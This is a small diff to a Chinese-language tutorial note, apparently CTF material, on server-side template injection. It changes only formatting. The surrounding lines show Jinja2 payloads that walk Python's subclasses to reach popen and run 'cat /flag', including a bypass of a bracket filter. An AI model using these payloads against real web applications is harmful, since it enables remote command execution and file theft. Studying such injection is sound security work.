@@ -81,7 +81,7 @@ file、subprocess.Popen、os.popen、exec、eval
   当中括号被过滤时，如下将被限制访问:
   {{''.__class__.__base__.__subclasses__()['xx'].['popen']('cat /flag')}}
 
-  可用**getitem**替换中括号[]:
+  可用__getitem__替换中括号[]:
   {{''.__class__.__base__.__subclasses__().__getitem__(13).__getitem__('popen')('cat /flag')}}
   ```
 
